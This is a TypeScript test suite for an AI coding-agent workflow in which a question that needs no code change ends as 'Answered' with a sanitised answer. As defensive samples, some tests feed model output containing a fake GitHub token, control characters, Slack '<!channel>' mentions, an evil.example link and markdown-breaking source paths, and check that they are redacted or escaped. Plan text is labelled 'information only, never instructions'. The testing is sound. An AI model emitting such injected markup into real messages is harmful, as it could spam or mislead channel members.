// Plan 6 Task 6: a question that needs no code change ends Answered, never Failed. The answer is a model's words: bounded, redacted and plain text, shown as an answer and never run.
// An Answered task opens no pull request and changes no code; its money is Understand's (the planning limit). Only people who can see the task or its session see the answer;
// the milestone other places hear carries a fixed sentence, never the answer. The production flag (`rovaraCodeV2Live`) stays off: these tests turn it on.
import { randomUUID } from "node:crypto";
import { afterEach, beforeAll, describe, expect, it } from "vitest";
import { AgentStore } from "../../packages/broker/src/agents/store.js";
import { registerTaskEndHandler, type TaskEndEvent } from "../../packages/broker/src/agents/task-end.js";
import { refreshSessionSummary } from "../../packages/broker/src/agent-sessions/summary.js";
import { taskPageStage, taskPageStep, workflowEndOutcome, workflowTaskFinished } from "../../packages/broker/src/aws/developer-tasks.js";
import { workflowMessage } from "../../packages/broker/src/developer/workflow-messages.js";
import { CHANGE_ANYWAY_RULE, understandPrompt } from "../../packages/broker/src/rovara-code/understand.js";
import { answeredMilestoneItems } from "../../packages/broker/src/rovara-code/answered.js";
import { CodeIntentRequestSchema } from "../../packages/contracts/src/rovara-code-intent.js";
import { FOLLOW_UP_UNAVAILABLE_MESSAGE, NOT_ANSWERED_MESSAGE, SESSION_ON_MAC_FOLLOW_UP_MESSAGE } from "../../packages/broker/src/rovara-code/change-anyway.js";
import { registerCodeMilestoneHandler } from "../../packages/broker/src/rovara-code/milestones.js";
import { agentSessionKey, builtinSettingsKey, projectMemberKey } from "../../packages/contracts/src/org-scoped-keys.js";
import {
  ANSWERED_MESSAGE_HEADER, ANSWERED_MILESTONE_TEXT, CHANGE_ANYWAY_NOTE, CLOSED_AS_ANSWERED_REASON, NoChangeNeededSchema, answerSourceLine, answeredMessage,
  type CodeMilestone, type IntentAssessment,
} from "../../packages/contracts/src/rovara-code.js";
import { DeveloperTaskResponseSchema, NO_CHANGE_VALUE_HIDDEN, SessionResponseReaderSchema, UNDERSTAND_ARTIFACT_NAME } from "../../packages/contracts/src/index.js";
import { WORKFLOW_BLOCK_REASONS } from "../../packages/contracts/src/task-workflow.js";
import { WORKFLOW_NO_CODE_CHANGE_MESSAGE, WorkflowDecisionRequestSchema, WorkflowSnapshotSchema, answerWorkflowIntent, createWorkflowSnapshot, decideWorkflow, recordIntentAssessment, startWorkflowUnderstand, workflowAnswer } from "../../packages/contracts/src/task-workflow-node.js";
import { canonicalPlanJson, parsePlanDocument, planDocumentMarkdown, readCanonicalPlan } from "../../packages/contracts/src/workflow-plan-document.js";
import { MAYA, OMAR, createDeveloperTaskBroker, seedMembership, type Developer } from "../support/developer-task-broker.js";
import { fakeModelAccess } from "../support/fake-model-access.js";
import { planAnswer, planDocument } from "../support/plan-documents.js";
import { TEST_ORG } from "../support/orgs.js";
import { loadSlackBroker } from "../support/slack-broker.js";

const NOW = "2026-10-26T12:00:00.000Z";
const LATER = "2026-10-26T12:30:00.000Z";
const TASK_ID = "8b579b4b-eaa7-4bf2-87bc-6da86b97c9e6";
const OWNER = "a".repeat(64);
const PROXY_URL = "http://internal-proxy.example.test:4000";
const ORG_B = "org_bbbbbbbbbbbbbbbbbbbb" as never;
const PREPARED = { result: { preparedBase: [{ repositoryId: "demo", baseCommitSha: "e".repeat(40) }] } };
const ARJUN: Developer = { developerId: "a1".repeat(32), name: "Arjun Rao", provider: "oidc", sessionId: "s-arjun" };
const MAX: Developer = { developerId: "b2".repeat(32), name: "Max Weber", provider: "oidc", sessionId: "s-max" };
const MIA: Developer = { developerId: "c3".repeat(32), name: "Mia Torres", provider: "oidc", sessionId: "s-mia" };

beforeAll(loadSlackBroker);

const answerAssessment = (extra: Partial<Extract<IntentAssessment, { kind: "answer" }>> = {}): Extract<IntentAssessment, { kind: "answer" }> => ({
  kind: "answer", restatement: "What does the retry flag do?", answer: "It turns retries on, for the payment worker only.",
  sources: [{ repository: "demo", path: "src/retry.ts", line: 4 }, { repository: "demo", path: "docs/flags.md" }], ...extra,
});
const ready = (): IntentAssessment => ({ kind: "ready", path: "QUICK", restatement: "Make the retry flag read the config file.", assumptions: [] });
const created = (extra: Record<string, unknown> = {}) =>
  createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW, definitionVersion: "1.1.0", understand: true, pathFrom: "understand", ...extra });
const running = (extra: Record<string, unknown> = {}) => startWorkflowUnderstand(created(extra), NOW);
const FROM = { id: "art-1", objectKey: "private/owner/ws/intent.json", createdAt: NOW };
const answered = (assessment: unknown = answerAssessment(), over: Record<string, unknown> = {}) =>
  answerWorkflowIntent(running(), { expectedRevision: running().revision, assessment, artifact: FROM, now: LATER, ...over });

// ---- the workflow's move

describe("answerWorkflowIntent: a question-only intent ends Answered", () => {
  it("ends CLOSED/COMPLETE with the outcome ANSWERED, one revision on, keeping the answer on intent and as an answer artifact", () => {
    const before = running();
    const next = answered();
    expect(next).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", revision: before.revision + 1, updatedAt: LATER });
    expect(workflowAnswer(next)).toEqual(answerAssessment());
    expect(next.artifacts).toEqual([expect.objectContaining({ type: "answer", version: 1, id: FROM.id, objectKey: FROM.objectKey, producer: "agentx-worker-untrusted", sha256: expect.stringMatching(/^[a-f0-9]{64}$/u) as unknown as string })]);
    expect(before.state).toBe("RUNNING");
    expect(WorkflowSnapshotSchema.safeParse(next).success).toBe(true);
  });

  it("ends a Full workflow too, which keeps naming its approval phase", () => {
    const full = startWorkflowUnderstand(created({ path: "FULL", pathFrom: "request" }), NOW);
    const next = answerWorkflowIntent(full, { expectedRevision: full.revision, assessment: answerAssessment(), artifact: FROM, now: LATER });
    expect(next).toMatchObject({ stage: "CLOSED", outcome: "ANSWERED", path: "FULL", reviewPhase: "REQUIREMENTS" });
  });

  it("is not a plan, a pull request or a decision: no candidate, no pull request, no decision, and the plan stage never ran", () => {
    const next = answered();
    expect(next.candidate).toBeUndefined();
    expect(next.pullRequests ?? []).toEqual([]);
    expect(next.decisions).toEqual([]);
    expect(next.artifacts.map((artifact) => artifact.type)).toEqual(["answer"]);
  });

  it("keeps the answer's digest the same for the same words and different for other words", () => {
    expect(answered().artifacts[0]!.sha256).toBe(answered().artifacts[0]!.sha256);
    expect(answered(answerAssessment({ answer: "Something else." })).artifacts[0]!.sha256).not.toBe(answered().artifacts[0]!.sha256);
    expect(answered(answerAssessment({ sources: [] })).artifacts[0]!.sha256).not.toBe(answered().artifacts[0]!.sha256);
  });

  it("answers only an Understand step that is running, at the revision that was read, on a 1.1.0 workflow, and only an answer", () => {
    const current = running();
    const attempt = (workflow: unknown, over: Record<string, unknown> = {}) =>
      () => answerWorkflowIntent(workflow, { expectedRevision: (workflow as { revision: number }).revision, assessment: answerAssessment(), artifact: FROM, now: LATER, ...over });
    expect(attempt(current)).not.toThrow();
    expect(attempt(current, { expectedRevision: current.revision - 1 })).toThrow(/stale/);
    expect(attempt(created())).toThrow(/not understanding/);
    expect(attempt(WorkflowSnapshotSchema.parse({ ...current, state: "WAITING" }))).toThrow(/not understanding/);
    expect(attempt(createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW }))).toThrow(/not understanding/);
    expect(attempt(current, { assessment: ready() })).toThrow(/not an answer/);
    expect(attempt(current, { assessment: { ...answerAssessment(), approve: true } })).toThrow(/not an answer/);
    expect(attempt(current, { assessment: { ...answerAssessment(), answer: "" } })).toThrow(/not an answer/);
  });

  it("is the only way an answer is recorded: recordIntentAssessment refuses it", () => {
    expect(() => recordIntentAssessment(running(), { expectedRevision: running().revision, assessment: answerAssessment(), now: NOW })).toThrow(/answerWorkflowIntent/);
  });

  it("redacts a credential, makes control characters spaces and keeps the answer's line breaks, again when it is kept", () => {
    const token = `ghp_${"a1B2".repeat(9)}`;
    const next = answered(answerAssessment({ answer: `Use ${token} for it.\u0007‮\nSecond line.`, sources: [{ repository: "demo", path: `src/${token}.ts` }], restatement: `About ${token}` }));
    const text = JSON.stringify(next.intent);
    expect(text).not.toContain(token);
    expect(text).toContain("[REDACTED]");
    expect(text).not.toMatch(/\\u0007|\\u202e/u);
    expect(workflowAnswer(next)!.answer).toContain("\nSecond line.");
  });

  it("a version 1 workflow cannot hold the outcome or the artifact", () => {
    const v1 = createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW });
    expect(WorkflowSnapshotSchema.safeParse({ ...v1, stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED" }).success).toBe(false);
    const art = { id: "a", type: "answer", version: 1, sha256: "a".repeat(64), producer: "x", objectKey: "k", createdAt: NOW };
    expect(WorkflowSnapshotSchema.safeParse({ ...v1, artifacts: [art] }).success).toBe(false);
    expect(WorkflowSnapshotSchema.safeParse({ ...answered(), artifacts: [art] }).success).toBe(true);
  });

  it("workflowAnswer reads an answer only from a workflow that ended ANSWERED", () => {
    expect(workflowAnswer(answered())).toBeDefined();
    expect(workflowAnswer(running())).toBeUndefined();
    expect(workflowAnswer({ ...answered(), outcome: "CLOSED" })).toBeUndefined();
  });
});

// ---- the message

describe("the answer's message", () => {
  it("starts with the exact line, then the answer, then its sources as repository/path:line", () => {
    const text = answeredMessage(answerAssessment());
    expect(ANSWERED_MESSAGE_HEADER).toBe("No code change is needed. Here's the answer:");
    expect(text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
    expect(text.split("\n")[1]).toBe("It turns retries on, for the payment worker only.");
    expect(text).toContain("- demo/src/retry.ts:4");
    expect(text).toContain("- demo/docs/flags.md");
    expect(text).not.toContain("flags.md:");
  });

  it("makes a source one plain line and never lets a model's words add markup to it", () => {
    const line = answerSourceLine({ repository: "de<mo>", path: "src/a\nb```c.ts", line: 3 });
    expect(line).not.toMatch(/[<>\n]/u);
    expect(line).not.toContain("```");
    expect(line.endsWith(":3")).toBe(true);
  });

  it("is plain text: control characters become spaces, a long run of line breaks is two, at most 10 sources, and the answer is cut at its limit", () => {
    const sources = Array.from({ length: 12 }, (_, index) => ({ repository: "demo", path: `f${String(index)}.ts` }));
    const text = answeredMessage({ answer: `a\u0007b\n\n\n\n\nc${"x".repeat(5000)}`, sources });
    expect(text.includes(String.fromCharCode(7))).toBe(false);
    expect(text).not.toMatch(/\n{3,}/u);
    expect(text.split("\n").filter((line) => line.startsWith("- ")).length).toBe(10);
    expect(text.length).toBeLessThan(4300);
  });

  it("is escaped for Slack as every model-written line is, and reads the same on the task's closing post", () => {
    const next = answered(answerAssessment({ answer: "Use <!channel> & <https://evil.example|click>" }));
    const text = workflowMessage({ taskId: TASK_ID, workflow: next })?.text ?? "";
    expect(text.split("\n")[0]).toBe("No code change is needed. Here&#39;s the answer:".replace("&#39;", "'"));
    expect(text).toContain("&lt;!channel&gt; &amp; &lt;https://evil.example|click&gt;");
    expect(text).not.toMatch(/<(?!\/?$)/u);
    expect(text).toContain("demo/src/retry.ts:4");
  });

  it("a task that ended Answered but whose answer can't be read still says no change is needed", () => {
    const { intent: _intent, ...bare } = answered();
    void _intent;
    expect(workflowMessage({ taskId: TASK_ID, workflow: bare })?.text).toBe("No code change is needed.");
  });

  it("is not what a rejected plan, a timed-out Understand or an ordinary close says", () => {
    const rejected = WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] });
    expect(workflowMessage({ taskId: TASK_ID, workflow: rejected })?.text).toBe("Closed without changes.");
  });
});

// ---- where an Answered task reads

describe("how an Answered task reads everywhere else", () => {
  it("is a finished task whose end handlers hear `answered`, never `closed` and never `failed`", () => {
    const task = { workflow: answered() };
    expect(workflowTaskFinished(task)).toBe(true);
    expect(workflowEndOutcome(task)).toBe("answered");
    expect(workflowEndOutcome({ workflow: WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] }) })).toBe("closed");
    expect(workflowEndOutcome({ workflow: WorkflowSnapshotSchema.parse({ ...answered(), outcome: "CLOSED", artifacts: [] }) })).toBe("closed");
  });

  it("reads \"Answered\" on the page's strip and in its status, also after the owner closed it", () => {
    expect(taskPageStep(answered(), false)).toBe("Answered");
    expect(taskPageStep(answered(), true)).toBe("Answered");
    expect(taskPageStage(answered(), false, true)).toMatchObject({ status: "Answered" });
    expect(taskPageStage(answered(), true, true)).toMatchObject({ status: "Answered" });
    expect(taskPageStage(WorkflowSnapshotSchema.parse({ ...answered(), outcome: "REJECTED", artifacts: [] }), false, true)).toMatchObject({ status: "Closed" });
  });

  it("the `answered` milestone is one per task, carries a fixed sentence and never the answer, and is written only for a task that ended Answered", () => {
    const task = { taskId: TASK_ID, orgId: TEST_ORG, sessionId: "ses_aaaaaaaaaaaaaaaaaaaa" };
    const items = answeredMilestoneItems({ tableName: "state" }, task, answered(), LATER);
    const put = items.find((item) => item.Put?.Item?.entityType === "CODE_MILESTONE")?.Put?.Item as Record<string, unknown>;
    expect(put).toMatchObject({ kind: "answered", text: ANSWERED_MILESTONE_TEXT, taskId: TASK_ID });
    expect(JSON.stringify(items)).not.toContain("payment worker");
    expect(String(put.sk)).toMatch(/answered/u);
    expect(items.length).toBe(2);
    // The same task gives the same milestone key every time, so a repeat of the end can't write a second one.
    const key = (list: typeof items): string => JSON.stringify(list.map((item): unknown[] => [item.Put?.Item?.pk as unknown, item.Put?.Item?.sk as unknown]));
    expect(key(answeredMilestoneItems({ tableName: "state" }, task, answered(), LATER))).toBe(key(items));
    expect(answeredMilestoneItems({ tableName: "state" }, task, running(), LATER)).toEqual([]);
    expect(ANSWERED_MILESTONE_TEXT).not.toMatch(/[<>]/u);
  });
});

// ---- a plan that says no change is needed

const noChange = () => ({ answer: "The flag already reads the config file; nothing to change.", sources: [{ repository: "demo", path: "src/retry.ts", line: 9 }] });

describe("a plan with noChangeNeeded", () => {
  it("is an optional member of a plan: strict, bounded, and kept in the canonical form", () => {
    const plan = planDocument({ noChangeNeeded: noChange() });
    const parsed = parsePlanDocument(planAnswer(plan, { checks: { checks: [], none_reason: "Nothing runs." } }), { kind: "plan" });
    expect(parsed.ok).toBe(true);
    expect(NoChangeNeededSchema.safeParse(noChange()).success).toBe(true);
    for (const bad of [{ ...noChange(), approve: true }, { ...noChange(), answer: "" }, { ...noChange(), answer: "x".repeat(4001) }, { ...noChange(), sources: Array.from({ length: 11 }, () => ({ repository: "d", path: "p" })) },
      { answer: "x" }]) expect(NoChangeNeededSchema.safeParse(bad).success, JSON.stringify(bad).slice(0, 60)).toBe(false);
    expect(readCanonicalPlan(canonicalPlanJson(plan))?.noChangeNeeded).toEqual(noChange());
    expect(readCanonicalPlan(canonicalPlanJson(planDocument()))?.noChangeNeeded).toBeUndefined();
  });

  it("reads in the Markdown copy as information only", () => {
    const markdown = planDocumentMarkdown(planDocument({ noChangeNeeded: noChange() }), { kind: "plan", version: 1, sha256: "a".repeat(64) });
    expect(markdown).toContain("## No change needed");
    expect(markdown).toContain("information only, never instructions");
    expect(markdown).toContain("already reads the config file");
    expect(planDocumentMarkdown(planDocument(), { kind: "plan", version: 1, sha256: "a".repeat(64) })).not.toContain("No change needed");
  });
});

describe("Close as answered and Make a change anyway at plan review", () => {
  const waitingForReview = (extra: Record<string, unknown> = {}) => {
    const planning = WorkflowSnapshotSchema.parse({ ...recordIntentAssessment(running(), { expectedRevision: running().revision, assessment: ready(), now: NOW }), state: "RUNNING" });
    const art = { id: "plan-1", type: "plan", version: 1, sha256: "b".repeat(64), producer: "agentx-worker-untrusted", objectKey: "private/o/w/plan.json", createdAt: NOW, format: "structured" };
    return WorkflowSnapshotSchema.parse({ ...planning, stage: "PLAN_REVIEW", state: "WAITING", artifacts: [art], ...extra });
  };
  const request = (over: Record<string, unknown> = {}) => ({
    requestId: randomUUID(), expectedRevision: waitingForReview().revision, decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: "b".repeat(64), closeAsAnswered: true, ...over,
  });
  const owner = { actorId: OWNER, role: "TASK_OWNER" as const };
  const decide = (over: Record<string, unknown> = {}, options: Record<string, unknown> = {}, workflow = waitingForReview()) =>
    decideWorkflow(workflow, request(over), owner, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "Retry flag" }, ...options });

  it("Close as answered ends the task ANSWERED with the plan's answer, recording a REJECT decision marked closedAs ANSWERED", () => {
    const next = decide();
    expect(next).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", revision: waitingForReview().revision + 1 });
    expect(next.decisions.at(-1)).toMatchObject({ decision: "REJECT", closedAs: "ANSWERED", reason: CLOSED_AS_ANSWERED_REASON, actorId: OWNER });
    expect(workflowAnswer(next)).toMatchObject({ answer: noChange().answer, restatement: "Retry flag", sources: noChange().sources });
    expect(next.artifacts.map((artifact) => artifact.type)).toEqual(["plan", "answer"]);
    expect(next.artifacts.at(-1)).toMatchObject({ objectKey: "private/o/w/plan.json" });
  });

  it("needs a plan that says no change is needed, a 1.1.0 workflow, the owner and the current plan's digest", () => {
    expect(() => decide({}, { noChangeNeeded: undefined })).toThrow(/does not say that no change is needed/);
    expect(() => decide({ artifactDigest: "c".repeat(64) })).toThrow(/current plan digest/);
    expect(() => decide({ expectedRevision: 1 })).toThrow(/stale/);
    expect(() => decideWorkflow(waitingForReview(), request(), { actorId: "f".repeat(64), role: "TASK_OWNER" }, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "x" } })).toThrow(/task owner/);
    expect(() => decide({}, {}, createWorkflowSnapshot({ taskId: TASK_ID, ownerId: OWNER, now: NOW }))).toThrow();
  });

  it("is only a way to close a plan: Approve, Request changes and Skip cannot carry it", () => {
    for (const decision of ["APPROVE", "REQUEST_CHANGES", "SKIP"]) expect(WorkflowDecisionRequestSchema.safeParse(request({ decision })).success, decision).toBe(false);
    expect(WorkflowDecisionRequestSchema.safeParse(request()).success).toBe(true);
    expect(WorkflowDecisionRequestSchema.safeParse(request({ closeAsAnswered: false })).success).toBe(false);
  });

  it("a plain Reject of the same plan still ends REJECTED, with no answer", () => {
    const next = decide({ closeAsAnswered: undefined, reason: "No." });
    expect(next).toMatchObject({ stage: "CLOSED", outcome: "REJECTED" });
    expect(next.decisions.at(-1)?.closedAs).toBeUndefined();
    expect(workflowAnswer(next)).toBeUndefined();
  });

  it("a repeat of the same request changes nothing, and the same id used for a plain Reject is a different decision", () => {
    const first = request();
    const once = decideWorkflow(waitingForReview(), first, owner, { now: LATER, allowedSkipStages: [], noChangeNeeded: { ...noChange(), restatement: "x" } });
    expect(decideWorkflow(once, first, owner, { now: LATER, allowedSkipStages: [] })).toEqual(once);
    const { closeAsAnswered: _closeAsAnswered, ...plain } = first;
    void _closeAsAnswered;
    expect(() => decideWorkflow(once, plain, owner, { now: LATER, allowedSkipStages: [] })).toThrow(/different workflow decision/);
  });

  it("Make a change anyway is the ordinary Request changes with the note, sent back to the plan step", () => {
    expect(CHANGE_ANYWAY_NOTE).toBe("Make the change anyway.");
    const next = decideWorkflow(waitingForReview(), { requestId: randomUUID(), expectedRevision: waitingForReview().revision, decision: "REQUEST_CHANGES", reason: CHANGE_ANYWAY_NOTE, artifactDigest: "b".repeat(64) }, owner, { now: LATER, allowedSkipStages: [] });
    expect(next).toMatchObject({ stage: "PLAN", state: "READY", outcome: "CHANGES_REQUESTED" });
    expect(next.decisions.at(-1)).toMatchObject({ decision: "REQUEST_CHANGES", reason: "Make the change anyway." });
  });

  it("the plan-review card gives the answer and says what the owner can do, with the ordinary buttons", () => {
    const structured = { claims: ["1. x"], claimCount: 1, decisionCount: 0, tiny: true, noChangeNeeded: { answer: "Use <!channel> here & there", sources: noChange().sources } };
    const message = workflowMessage({ taskId: TASK_ID, workflow: waitingForReview(), structured, taskPageUrl: "https://example.test/review/t/task" })!;
    expect(message.text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
    expect(message.text).toContain("&lt;!channel&gt; here &amp; there");
    expect(message.text).toContain("Close it as answered, or ask for the change anyway");
    // Only the link to the task page opens a tag: nothing a model wrote does.
    expect(message.text.replace(/<https:[^>|]+\|[^>]+>/u, "")).not.toMatch(/[<>]/u);
    expect(message.text).not.toContain("<!");
  });
});

// ---- through the real broker

async function world(options: { live?: boolean; orgs?: boolean } = {}) {
  const access = fakeModelAccess();
  const h = await createDeveloperTaskBroker({ ...(options.orgs === true ? { orgResolver: async (subject) => (subject.developerId === OMAR.developerId ? ORG_B : TEST_ORG) } : {}), brokerExtra: { agents: { ...(options.live === false ? {} : { rovaraCodeV2Live: true }) }, modelAccess: { access, proxyUrl: PROXY_URL }, cloud: true } });
  access.setMemberSpent(TEST_ORG, MAYA.developerId, 0);
  access.setOrgSpent(TEST_ORG, 0);
  const store = new AgentStore({ documentClient: h.db, tableName: "state", now: Date.now });
  await store.ensureBuiltinSettings(TEST_ORG, "rovara-code");
  h.db.set({ ...builtinSettingsKey(TEST_ORG, "rovara-code"), entityType: "BUILTIN_AGENT_SETTINGS", pinnedVersion: 2, updatedBy: "test", updatedAt: NOW });
  const member = async (who: Developer, role: "viewer" | "developer" | undefined = "developer") => {
    h.db.set({ pk: `SESSION#${who.sessionId}`, sk: "META", sessionId: who.sessionId, developerId: who.developerId, amr: who.provider, startedAt: new Date(Date.now() - 60_000).toISOString(), endsAt: Math.floor(Date.now() / 1000) + 604_800 });
    h.db.set({ pk: `DEVELOPER#${who.developerId}`, sk: "META", developerId: who.developerId, provider: who.provider, displayName: who.name, firstSignInAt: "x", lastSignInAt: "x", revoked: false });
    seedMembership(h.db, who.developerId, { orgId: TEST_ORG, role: "member" });
    if (role !== undefined) h.db.set({ ...projectMemberKey(TEST_ORG, who.developerId, "payments"), entityType: "MEMBERSHIP", ownerKey: who.developerId, projectName: "payments", grantId: randomUUID(), role, projectRole: role === "viewer" ? "viewer" : "contributor" });
  };
  type Meta = Record<string, unknown> & {
    workspaceId: string; sessionId: string; budgetUsd?: number; closedAt?: string; releasedAt?: string; requestText?: string; retryOfTaskId?: string; developerId: string; payer?: { kind: string; developerId?: string };
    workflow: { revision: number; stage: string; state: string; path: string; outcome?: string; blockReason?: string; artifacts: Array<{ type: string; sha256: string; objectKey: string }>; decisions: Array<Record<string, unknown>>;
      pullRequests?: unknown[]; candidate?: unknown; intent?: { assessment?: IntentAssessment; pathFrom: string } };
  };
  const meta = (taskId: string) => h.db.get(`DEVTASK#${taskId}`, "META") as Meta;
  const operations = (workspaceId: string) => h.db.find((item) => item.pk === `WORKSPACE#${workspaceId}` && item.entityType === "OPERATION");
  const operationOf = (workspaceId: string, mode: string) => operations(workspaceId).filter((item) => item.workflowMode === mode).at(-1);
  const invocationOf = (operationId: string) => h.db.find((item) => item.entityType === "OUTBOX" && item.operationId === operationId)[0]!.invocation as { callbackCapability: string; payload: Record<string, unknown> & { prompt: string } };
  const rows = () => h.db.find((item) => item.pk === "WORKFLOW_DISPATCH");
  const refreshSummary = (sessionId: string) => refreshSessionSummary({ documentClient: h.db, tableName: "state", now: Date.now, log: () => undefined }, TEST_ORG, sessionId);
  const start = async (body: Record<string, unknown> = {}, text = "What does the retry flag do?", who: Developer = MAYA) => {
    const reply = await h.dev(who, "POST", "/v1/app/projects/payments/code", { requestId: randomUUID(), input: { text }, ...body });
    expect(reply.status, JSON.stringify(reply.body)).toBe(202);
    const taskId = (reply.body.task as { taskId: string }).taskId;
    return { taskId, workspaceId: meta(taskId).workspaceId, sessionId: meta(taskId).sessionId };
  };
  const understanding = async (body: Record<string, unknown> = {}, text?: string, who: Developer = MAYA) => {
    const run = await start(body, text, who);
    await h.finish(run.workspaceId, String(operations(run.workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
    return { ...run, operationId: String(operationOf(run.workspaceId, "UNDERSTAND")!.id) };
  };
  const finishUnderstand = async (run: { workspaceId: string; operationId: string }, assessment: unknown) => {
    await h.artifact(run.workspaceId, run.operationId, UNDERSTAND_ARTIFACT_NAME, JSON.stringify(assessment));
    return h.finish(run.workspaceId, run.operationId, "SUCCEEDED", { result: { workflowMode: "UNDERSTAND" } });
  };
  /** A task whose Understand answered. */
  const answeredTask = async (assessment: unknown = answerAssessment(), body: Record<string, unknown> = {}, text?: string, who: Developer = MAYA) => {
    const run = await understanding(body, text, who);
    await finishUnderstand(run, assessment);
    return run;
  };
  /**
   * A task the person started on a chosen path that ended Answered, as one did before an explicit path always ran (now Understand's answer to such a start plans the change instead): the
   * workflow keeps `pathFrom: "request"`, so "Make a change anyway" still has to keep the path.
   */
  const answeredUnderChosenPath = async (path: "QUICK" | "FULL") => {
    const run = await answeredTask();
    const task = meta(run.taskId);
    h.db.set({ ...task, workflow: { ...task.workflow, path, ...(path === "FULL" ? { reviewPhase: "REQUIREMENTS" } : {}), intent: { ...task.workflow.intent, pathFrom: "request" } } });
    expect(meta(run.taskId).workflow).toMatchObject({ outcome: "ANSWERED", path, intent: { pathFrom: "request" } });
    return run;
  };
  /** A task whose plan says no change is needed, waiting for its owner. */
  const noChangePlan = async () => {
    const run = await understanding();
    await finishUnderstand(run, ready());
    const plan = operationOf(run.workspaceId, "PLAN")!;
    await h.artifact(run.workspaceId, String(plan.id), "plan.md", planAnswer(planDocument({ noChangeNeeded: noChange() }), { checks: { checks: [], none_reason: "Nothing runs." } }));
    await h.finish(run.workspaceId, String(plan.id), "SUCCEEDED", { result: { workflowMode: "PLAN" } });
    expect(meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
    const document = meta(run.taskId).workflow.artifacts.at(-1)!;
    return { ...run, digest: document.sha256 };
  };
  const decide = (who: Developer, taskId: string, body: Record<string, unknown>) =>
    h.dev(who, "POST", `/v1/dev/tasks/${taskId}/workflow/decision`, { requestId: randomUUID(), expectedRevision: meta(taskId).workflow.revision, ...body });
  const sessionRecord = (sessionId: string) => h.db.get(agentSessionKey(TEST_ORG, sessionId, "META")) as Record<string, unknown> & { summary: { status: string; step?: string } };
  const events = (sessionId: string) => h.db.find((item) => item.pk === agentSessionKey(TEST_ORG, sessionId, "META").pk && String(item.sk).startsWith("EVENT#")).map((item) => String(item.text));
  const milestones = (taskId: string) => h.db.find((item) => item.pk === `DEVTASK#${taskId}` && String(item.sk).startsWith("CODE_MILESTONE#answered"));
  const share = (sessionId: string, who: Developer, level: "view" | "use" | "edit") =>
    h.dev(MAYA, "PUT", `/v1/app/sessions/${sessionId}/shares`, { requestId: randomUUID(), principal: { kind: "member", developerId: who.developerId }, level });
  const changeAnyway = (who: Developer, sessionId: string, body: Record<string, unknown> = {}) => h.dev(who, "POST", `/v1/app/sessions/${sessionId}/change-anyway`, { requestId: randomUUID(), ...body });
  return { ...h, access, member, meta, operations, operationOf, invocationOf, rows, refreshSummary, start, understanding, finishUnderstand, answeredTask, answeredUnderChosenPath, noChangePlan, decide, sessionRecord, events, milestones, share, changeAnyway };
}

const ended: TaskEndEvent[] = [];
const heard: CodeMilestone[] = [];
const offs: Array<() => void> = [];
afterEach(() => { for (const off of offs.splice(0)) off(); ended.length = 0; heard.length = 0; });
const listen = () => {
  offs.push(registerTaskEndHandler(async (_deps, event) => { ended.push(event); }));
  offs.push(registerCodeMilestoneHandler({ name: "answered_test", on: async (_deps, milestone) => { heard.push(milestone); } }));
};
const errorOf = (reply: { body: Record<string, unknown> }) => reply.body.error as { code: string; message: string };

describe("Understand answers a question: the task ends Answered", () => {
  it("\"what does the retry flag do?\" ends CLOSED/COMPLETE/ANSWERED with the answer kept, no plan, no pull request, no code change, and the workspace given back", async () => {
    listen();
    const t = await world();
    const run = await t.answeredTask();
    const task = t.meta(run.taskId);
    expect(task.workflow).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED", intent: { assessment: answerAssessment() } });
    expect(task.workflow.artifacts.map((artifact) => artifact.type)).toEqual(["answer"]);
    expect(task.workflow.pullRequests ?? []).toEqual([]);
    expect(task.workflow.candidate).toBeUndefined();
    expect(t.operationOf(run.workspaceId, "PLAN")).toBeUndefined();
    expect(t.operations(run.workspaceId).map((item) => item.workflowMode).filter(Boolean)).toEqual(["UNDERSTAND"]);
    expect(t.rows().filter((item) => item.kind !== "operation_end")).toEqual([]);
    expect(task.releasedAt).toBeDefined();
    expect(task.blockReason ?? task.workflow.blockReason).toBeUndefined();
  });

  it("tells the end handlers `answered` exactly once, never `failed` or `closed`, and tells the milestone handlers `answered` once with a fixed sentence", async () => {
    listen();
    const t = await world();
    const run = await t.answeredTask();
    expect(ended.filter((event) => event.taskId === run.taskId).map((event) => event.outcome)).toEqual(["answered"]);
    expect(heard.filter((milestone) => milestone.taskId === run.taskId)).toEqual([expect.objectContaining({ kind: "answered", text: ANSWERED_MILESTONE_TEXT, sessionId: run.sessionId })]);
    expect(JSON.stringify(heard)).not.toContain("payment worker");
    expect(t.milestones(run.taskId)).toHaveLength(1);
  });

  it("its money is Understand's: one key was minted under the planning limit, which is unchanged, and nothing was spent after the answer", async () => {
    const t = await world();
    const run = await t.understanding();
    expect(t.meta(run.taskId).budgetUsd).toBe(2);
    await t.finishUnderstand(run, answerAssessment());
    expect(t.meta(run.taskId).budgetUsd).toBe(2);
    expect(t.access.mintKey.mock.calls.length).toBeLessThanOrEqual(1);
    const minted = t.access.mintKey.mock.calls.length;
    await t.handler({ source: "agentx.workflow-dispatch-recovery" });
    expect(t.access.mintKey.mock.calls.length).toBe(minted);
  });

  it("is in the duration history (Task 7 hand-off): an Answered task's time is written once, when it is released, on the path it ran", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const task = t.meta(run.taskId);
    expect(task.releasedAt).toBeDefined();
    expect(task.durationRecordedAt).toBeDefined();
    const history = t.db.find((item) => item.entityType === "DURATION_HISTORY");
    expect(history).toHaveLength(1);
    expect((history[0]!.durations as number[]).length).toBe(1);
  });

  it("is not in the run-cost history: an Answered run teaches the next estimate nothing", async () => {
    const t = await world();
    const run = await t.answeredTask();
